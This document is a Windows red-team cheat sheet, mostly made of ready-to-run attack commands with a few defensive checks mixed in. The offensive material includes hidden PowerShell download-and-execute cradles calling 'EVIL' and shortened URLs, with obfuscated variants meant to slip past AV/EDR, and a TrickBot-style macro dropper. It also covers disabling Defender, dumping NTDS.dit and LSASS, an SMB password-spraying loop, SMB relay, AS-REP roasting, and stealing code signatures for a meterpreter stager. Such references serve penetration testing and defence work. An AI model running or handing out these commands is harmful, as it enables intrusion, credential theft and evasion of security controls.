# PowerShell Tricks:

## PowerShell Change Timestamp of Directory:

```PS> (Get-Item "C:\Windows\system32\MyDir").CreationTime=("01 March 2019 19:00:00")```

## PowerShell Changing Modification Time of a File:

```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt").LastWriteTime=("01 March 2019 19:00:00")```

## PowerShell Changing Access Time of a File:

```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt ").LastAccessTime=("01 March 2019 19:00:00")```

## Enumerating Domain Users with PowerShell:


Save all Domain Users to a file

```
Get‐DomainUser | Out‐File ‐FilePath .\DomainUsers.txt
```

Will return specific properties of a specific user

```
Get‐DomainUser ‐Identity [username] ‐Properties DisplayName, MemberOf |
Format‐List
```

Enumerate user logged on a machine

```
Get‐NetLoggedon ‐ComputerName <ComputerName>
```

Enumerate Session Information for a machine

```
Get‐NetSession ‐ComputerName <ComputerName>
```

Enumerate domain machines of the current/specified domain where specific
users are logged in

```
Find‐DomainUserLocation ‐Domain <DomainName> | Select‐Object UserName,
SessionFromName
```

## Sneaky PowerShell Commands:

```powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file] '))"```

```powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetw orkCredentials;iwr('http://webserver/payload.ps1')|iex"```

PowerShell Downgrade Attack

```
PowerShell –Version 2 –Command <…>
```

Detecting PowerShell Downgrade Attacks

```
Get-WinEvent -LogName "Windows PowerShell" |
    Where-Object Id -eq 400 |
    Foreach-Object {
        $version = [Version] (
            $_.Message -replace '(?s).*EngineVersion=([\d\.]+)*.*','$1')
        if($version -lt ([Version] "5.0")) { $_ }
}
```

Disabling PowerShell Version 2

```
# Query the current status of PowerShell 2.0 components:
Get-WindowsOptionalFeature -Online -FeatureName "*PowerShellV2*"

# Disable PowerShell 2.0:
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

PowerShell Data Compression for Exfiltration

```
PS > Compress-Archive -Path <files to zip> -CompressionLevel
Optimal -DestinationPath <output path>
```

PowerShell File Hashing for Blue Teamers

```
Get-ChildItem -Path D:\Potentially_Malicious\Folder\ | Get-FileHash | Export-Csv -Path D:\PowerShell\FilesHashes_For_VirusTotal.csv -NoTypeInformation
```

## TrickBot PowerShell Download TTP:

1. Insert base64 string for malicious web server
2. Select filename for output in %tmp% directory
3. Attach to Office macro

```
cmd.exe /c powershell "'powershell ""$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''... Base64 string ...''));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
'""| out-file -filepath %tmp%\tmp9388.bat -encoding ascii; cmd /c '%tmp%\tmp9388.bat'
```

## Enable PowerShell Remoting:

Tip Provided By Joshua Wright:

By default, Windows Server 2012R2 and later have PowerShell remote access turned on by default. Windows 10 and Windows 11 systems have this feature turned off by default. To turn on PowerShell remote access, an administrator can run the ```Enable-PSRemoting``` command:

```
PS C:\WINDOWS\system32> Enable-PSRemoting
```

With the appropriate permissions, remote access to PowerShell is straightforward: run Enter-PSSession and specify the target host name or IP address using -ComputerName:

```
PS C:\WINDOWS\system32> Enter-PSSession -ComputerName VICTIM
[VICTIM]: PS C:\Users\Victim\Documents>
```

When you are done with your PowerShell remote session, run ```Exit-PSSession``` to return to your host system.

## PowerShell Password Manager and Clipboard Access:

Password managers offer many benefits for selection and storage of passwords.

```
PS C:\> $x=""; while($true) { $y=get-clipboard -raw; if ($x -ne $y) { Write-Host $y; $x=$y} }
```

# Living off the Land:

## Cscript/Wscript:

```cscript //E:jscript \\webdavserver\folder\payload.txt```

## MSHTA:

```mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload .sct"")"))```
```mshta \\webdavserver\folder\payload.hta```

## WMIC:

```wmic os get /format:"https://webserver/payload.xsl"```

## Examining Processes with WMIC:

```
wmic process list full
wmic process list brief
wmic process get name, parentprocessid,processid
wmic process where processid=pid get commandline
```
## WMI Recon:

```
wmic process get CSName,Description,ExecutablePath,ProcessId
wmic useraccount list full
wmic group list full
wmic netuse list full
wmic qfe get Caption,Description,HotFixID,InstralledOn
wmic startup get Caption,Command,Location,User
```

## Examining Network Usage:

```
netstat -na
netstat -naob
netstat -naob 5
netsh advfirewall show currentprofile
```

## Examining Services:

```
services.msc
net start
sc query | more
tasklist /svc
```

## Examining the Registry:

```
regedit
reg query <regkey>

# Potential Autostart Entry Points to Enumerate

HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOncEx

# NOTE: Inspect both HKCU and HKLM
```

Disabling Windows Defender in the Registry:

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```
## Examining Unusual Accounts:

```
lusrmgr.msc
net user
net localgroup <group>
```

## Examining Unusual Scheduled Tasks:

```
schtasks
```

## Eamining Unusual Log Entries:

```
wevutil qe security /f:text
Get-EventLog -LogName Security | Format-List -Property *
```

## TCPDump

```
tcpdump -i <interface> # Capture, can use "any" 
tcpdump -i <interface> -w <file> # Write to a file after capture
tcpdump -r <file> -n # Read from a file and don't resolve hosts and ports
tcpdump -r <file> -n -A # Read from a file and don't resolve hosts and ports, show as ASCII

# Berkeley Packet Filtering

tcpdump -r <file> 'host 8.8.8.8'
tcpdump -r <file> 'src host 8.8.8.8'
tcpdump -r <file> 'not src host 8.8.8.8'
tcpdump -r <file> 'icmp and (src host 8.8.8.8'
```

## Windows Domain Controller Hash Harvesting:

GOAL: Obtain ```NTDS.dit``` and SYSTEM registry hive data

```
C:\Users\RoseSecurity> ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\ntds

Copying registry files...
Copying c:\ntds\registry\SYSTEM
Copying c:\ntds\registry\SECURITY
IFM media created successfully in c:\ntds
ifm: quit
ntdsutil: quit
```

## Payload Download Cradles: (https://github.com/VirtualAlllocEx)

This are different types of download cradles which should be an inspiration to play and create new download cradles to bypass AV/EPP/EDR in context of download cradle detections. Notice, removing or obfuscating signatures from your download cradle is only one piece of the puzzle to bypass an AV/EPP/EDR. Depending on the respective product you have to modify your payload which should be downloaded by the cradle to bypass API-Hooking, Callbacks, AMSI etc.

```
# not proxy aware cmd download cradles 

# default download cradle 
c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")"
PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")"

# obfuscated v1
CMD> c:\wiNdoWs\sysTEM32\CmD  /c  pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/evil.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
CMD> pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/evil.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"

# proxy aware cmd download cradles

# default download cradle
c:\wInDOwS\sysTem32\CmD   /cPowErShell -wINdowstYL  Hi  -nop -eXecU ByPAss -COm    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring(\"https://cutt.ly/syFzILs\")"
PowErShell -wINdowstYL  Hi  -nop -eXecU ByPAss -COm    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring(\"https://cutt.ly/syFzILs\")"

# obfuscated v1
C:\WINdOWS\SySteM32\CmD.EXe  /cpOWershEll  -eXecut byPaSS -Noprof  -w  H -Co    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`e`x $c.downloadstring(\"ht\"+\"tps://cutt.ly/syFzILs\")"
poWershELl -execUT byPAss -WINDo  1  -nopR  -comm  "& ((vARiaBlE '*mdr*').Name[3,11,2]-JoiN'') ((('{2}c=new-obj'+'ect ne'+'t.'+'webclient;{2'+'}'+'c.p'+'roxy='+'[Net'+'.'+'WebR'+'equest]::'+'GetS'+'yst'+'emWebP'+'ro'+'x'+'y();{'+'2}c'+'.Pr'+'oxy.Cre'+'dentials=[Net'+'.Cr'+'edentialC'+'ache]::D'+'e'+'fau'+'l'+'tCredenti'+'als'+';{0}i{0}e'+'{0}x {'+'2}c.downl'+'oa'+'ds'+'t'+'ring({1}ht{1}+{1'+'}t'+'ps'+':'+'/'+'/'+'cutt.ly/syFzIL'+'s{1})') -F  [cHAR]96,[cHAR]34,[cHAR]36))"
```

# Living Off the Land: Windows Packet Capturing

Packet Monitor (Pktmon) is an in-box, cross-component network diagnostics tool for Windows. It can be used for packet capture, packet drop detection, packet filtering and counting.

```
C:\Users\SecurityNik>pktmon filter add IP-TCP-SYN-443 --data-link IPv4 --ip-address 172.217.2.115 --transport-protocol tcp SYN --port 443
Filter added.

C:\Users\SecurityNik>pktmon filters list
 # Name           EtherType Protocol  IP Address    Port
 - ----           --------- --------  ----------    ----
 1 IP-TCP-SYN-443 IPv4      TCP (SYN) 172.217.2.115  443

C:\Users\RoseSecurity>pktmon start  --etw --log-mode real-time --packet-size 1500
Active measurement started.
Processing...

23:02:26.539704700 PktGroupId 562949953421500, PktNumber 1, Appearance 1, Direction Tx , Type Ethernet , Component 78, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
23:02:26.539709400 PktGroupId 562949953421500, PktNumber 1, Appearance 2, Direction Tx , Type Ethernet , Component 31, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
23:02:26.539712200 PktGroupId 562949953421500, PktNumber 1, Appearance 3, Direction Tx , Type Ethernet , Component 32, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
23:02:26.539714000 PktGroupId 562949953421500, PktNumber 1, Appearance 4, Direction Tx , Type Ethernet , Component 33, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
23:02:26.599504500 PktGroupId 1688849860264106, PktNumber 1, Appearance 1, Direction Rx , Type Ethernet , Component 33, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        F0-B4-D2-5A-D3-E2 > 40-EC-99-B9-17-25, ethertype IPv4 (0x0800), length 66: 172.217.2.115.443 > 192.168.0.62.65066: Flags [S.], seq 546326696, ack 1995496357, win 60720, options [mss 1380,nop,nop,sackOK,nop,wscale 8], length 0
23:02:26.599510100 PktGroupId 1688849860264106, PktNumber 1, Appearance 2, Direction Rx , Type Ethernet , Component 32, 
... <TRUNCATED FOR BREVITY>....
```

Converting to PCAPNG

```
C:\Users\RoseSecurity>pktmon pcapng PktMon1.etl --out RoseSecurity-pktmon.pcapng
Processing...

Packets total:     60
Packet drop count: 0
Packets formatted: 60
Formatted file:    RoseSecurity-pktmon.pcapng
```
## SMB Password Guessing:

Create list of domain users

```
C:\> net user /domain > users.txt
```

Create password list 

```
C:\> notepad pass.txt
```

Start spraying!

```
C:\> @FOR /F %p in (pass.txt) DO @FOR /F %n in (users.txt) DO @net use \\SERVERIP\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
```

## SMB Lateral Movement:

Check if SMB signing is disabled on the endpoint:

```
nmap -p 445 <Victim IP> -sS --script smb-security-mode
```

Force authentication by crafting a HTML or file of your choice:

```
<html>
    <h1>The Dietary Benefits of Eating Ben and Jerry's Phish Food</h1>
    <img src="file://<Compromised Host>/download.jpg">
</html>
```

Fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them to the victim and will attempt to execute the command, ipconfig, on the end host:

```
smbrelayx.py -h <Victim IP> -c "ipconfig"
```
## PSexec with NMAP:

```
nmap --script smb-psexec.nse -script-args=smbuser=<username>, smbpass=<password>[,config=<config>] -p445 <hosts>
```

## AV LSASS Dump:

How to utilize Avast AV to dump LSASS (C:\Program Files\Avast Software\Avast)

```
AvDump.exe --pid 1111 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
```

## Certutil Download Cradle:

Download and save a Python file to an Alternate Data Stream (ADS).

```
certutil.exe -urlcache -split -f https://github.com/RoseSecurity/APOLOGEE/blob/main/siemens_field_panel_scanner.py c:\temp:apologee.py
```

## Kerberoasting with Impacket:

ASREPRoast

With Impacket example GetNPUsers.py:

```
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```
## Dumping LSASS With Visual Studio:

Dump64: Memory dump tool that comes with Microsoft Visual Studio

Path: C:\Program Files (x86)\Microsoft Visual Studio\Installer\Feedback\dump64.exe

Enumerate for Visual Studio install:

```
C:\> code -v
```

Find LSASS PID:

```
tasklist /fi "Imagename eq lsass.exe"
```

Uuse Dump64 to dump LSASS:

```
C:\> dump64.exe <pid> out.dmp
```

## Dumping LSASS Without Mimikatz:

To get LSASS process ID via CMD:

```
PS C:\Users\test> tasklist | findstr lsass
lsass.exe                      580 Services                   0     51,752 K
```

Depending on the EDR, it may be sufficient to simply add quotations around the process name (This bypasses Cortex XDR for example):

```
procdump.exe -accepteula -ma “lsass.exe” out.dmp
```

## Stealing Signatures with SigThief:

Download: https://github.com/secretsquirrel/SigThief

Rips a signature off a signed PE file and appends it to another one, fixing up the certificate table to sign the file.

```
$ ./sigthief.py -i procmon.exe -t x86_meterpreter_stager.exe -o /tmp/definitely_legit.exe 

Output file: /tmp/definitely_legit.exe 
Signature appended. 
FIN.
```
